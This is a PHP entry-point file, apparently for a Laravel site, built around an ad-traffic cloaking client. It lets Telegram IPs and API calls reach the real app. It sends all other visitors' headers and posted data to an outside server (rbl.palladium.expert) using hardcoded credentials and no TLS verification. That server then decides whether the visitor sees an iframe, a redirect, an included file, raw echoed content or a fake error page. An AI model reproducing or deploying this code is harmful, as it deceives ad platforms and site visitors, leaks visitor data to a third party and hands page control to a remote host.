<?php

// Telegram IP whitelist
$telegramIpRanges = [
    '149.154.160.0/20',
    '91.108.4.0/22',
    '91.108.56.0/22',
    '91.108.8.0/22',
    '91.108.12.0/22',
    '91.108.16.0/22',
    '91.108.20.0/22',
    '95.161.64.0/20',
];

function isTelegramIp($ip, $ranges) {
    foreach ($ranges as $range) {
        if (cidrMatch($ip, $range)) {
            return true;
        }
    }
    return false;
}

function cidrMatch($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    $ipLong = ip2long($ip);
    $subnetLong = ip2long($subnet);
    $maskBits = -1 << (32 - $mask);
    $subnetLong &= $maskBits;
    return ($ipLong & $maskBits) == $subnetLong;
}

$clientIp = $_SERVER['REMOTE_ADDR'] ?? '';
$requestUri = $_SERVER['REQUEST_URI'] ?? '';

// X-Forwarded-For for proxies (Cloudflare etc)
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $forwardedIps = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $clientIp = trim($forwardedIps[0]);
}

// Debug log
error_log("Cloaker check - IP: $clientIp, URI: $requestUri, Is TG: " . (isTelegramIp($clientIp, $telegramIpRanges) ? 'yes' : 'no'));

// Bypass cloaker for Telegram IPs OR API requests
$isApiRequest = strpos($requestUri, '/api/') === 0 || strpos($requestUri, '/api/') !== false;

if (isTelegramIp($clientIp, $telegramIpRanges) || $isApiRequest) {
    require __DIR__.'/../vendor/autoload.php';
    $app = require_once __DIR__.'/../bootstrap/app.php';
    $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
    $response = $kernel->handle($request = Illuminate\Http\Request::capture());
    $response->send();
    $kernel->terminate($request, $response);
    exit;
}
$isTarget = (new RequestHandlerClient())->run();



class RequestHandlerClient
{
    const SERVER_URL = 'https://rbl.palladium.expert';

    /**
     * @param int    $clientId
     * @param string $company
     * @param string $secret
     *
     * @return void
     * @throws \Exception
     */
    public function run()
    {
        $headers = [];
        $headers['request'] = $this->collectRequestData();
        $headers['jsrequest'] = $this->collectJsRequestData();
        $headers['server'] = $this->collectHeaders();
        $headers['auth']['clientId'] = 6059;
        $headers['auth']['clientCompany'] = "Ad1lF7pgdGDTiCnQQ7MV";
        $headers['auth']['clientSecret'] = "NjA1OUFkMWxGN3BnZEdEVGlDblFRN01WY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==";
        $headers['server']['bannerSource'] = 'adwords';

        return $this->curlSend($headers);
    }

    /**
     * @param array<string, mixed> $params
     *
     * @return bool
     * @throws \Exception
     */
    public function curlSend(array $params)
    {
        $answer = false;
        $curl = curl_init(self::SERVER_URL);
        if ($curl) {
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));

            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);

            $result = curl_exec($curl);
            if ($result) {
				$serverOut = json_decode(
					$result,
					true
				);
				$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

				if ($status == 200 && is_array($serverOut)) {
					$answer = $this->handleServerReply($serverOut);
					return $answer;
				}
			}
        }

		$this->getDefaultAnswer();
        return $answer;
    }

    protected function handleServerReply($reply)
    {
        $result = (bool) ($reply['result'] ? $reply['result'] : 0);

        if (
			isset($reply['mode']) &&
			(
				(isset($reply['target'])) ||
				(isset($reply['content']) && !empty($reply['content']))
			)
		) {
            $target = $reply['target'];
            $mode = $reply['mode'];
            $content = $reply['content'];

            if (preg_match('/^https?:/i', $target) && $mode == 3) {
                // do fallback to mode2
                $mode = 2;
            }

            if ($result && $mode == 1) {
				$this->displayIFrame($target);
				exit;
			} elseif ($result && $mode == 2) {
				header("Location: {$target}");
				exit;
			} elseif ($result && $mode == 3) {
				$target = parse_url($target);
				if (isset($target['query'])) {
					parse_str($target['query'], $_GET);
				}
				$this->hideFormNotification();
				require_once $this->sanitizePath($target['path']);
				exit;
			} elseif ($result && $mode == 4) {
				echo $content;
				exit;
			} else if (!$result && $mode == 5) {
				//
			} elseif ($mode == 6) {
				//
			} else {
				$path = $this->sanitizePath($target);
				if (!$this->isLocal($path)) {
					header("404 Not Found", true, 404);
				} else {
					$this->hideFormNotification();
					require_once $path;
				}
				exit;
			}
        }

        return $result;
    }

	private function hideFormNotification()
	{
		echo "";
		//echo "<script>if ( window.history.replaceState ) {window.history.replaceState( null, null, window.location.href );}</script>";
	}

	private function displayIFrame($target) {
		$target = htmlspecialchars($target);
		echo "<html>
                  <head>
                  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
                  </head>
                  <body>" .
                  $this->hideFormNotification() .
                  "<iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>
                  </body>
              </html>";
	}

    private function sanitizePath($path)
    {
        if ($path[0] !== '/') {
            $path = __DIR__ . '/' . $path;
        } else {
            $path = __DIR__ . $path;
        }
        return $path;
    }

    private function isLocal($path)
    {
        // do not validate url via filter_var
        $url = parse_url($path);

        if (!isset($url['scheme']) || !isset($url['host'])) {
            return true;
        } else {
            return false;
        }
    }


    /**
     * Get all HTTP server headers and few additional ones
     *
     * @return mixed
     */
    protected function collectHeaders()
    {
        $userParams = [
            'REMOTE_ADDR',
            'SERVER_PROTOCOL',
            'SERVER_PORT',
            'REMOTE_PORT',
            'QUERY_STRING',
            'REQUEST_SCHEME',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE',
            'X_PURPOSE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Frame-Options',
        ];

        $headers = [];
        foreach ($_SERVER as $key => $value) {
            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
                $headers[$key] = $value;
            }
        }
        $headers['HTTP_ACCEPT_ENCODING'] = 'gzip, deflate, br';
        return $headers;
    }

    private function collectRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['data'])) {
            	$data = json_decode($_POST['data'], true);
            	if (JSON_ERROR_NONE !== json_last_error()) {
            		$data = json_decode(
						stripslashes($_POST['data']),
						true
					);
            	}
                unset($_REQUEST['data']);
            }

            if (!empty($_POST['crossref_sessionid'])) {
                $data['cr-session-id'] = $_POST['crossref_sessionid'];
                unset($_POST['crossref_sessionid']);
            }
        }

        return $data;
    }

    public function collectJsRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['jsdata'])) {
                $data = json_decode($_POST['jsdata'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $data = json_decode(
                        stripslashes($_POST['jsdata']),
                        true
                    );
                }
                unset($_REQUEST['jsdata']);
            }
        }
        return $data;
    }

    /**
     * Default answer for the curl request in case of fault
     *
     * @return bool
     */
    private function getDefaultAnswer()
    {
		header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
		echo "<h1>500 Internal Server Error</h1>
		<p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
		exit;
    }
}
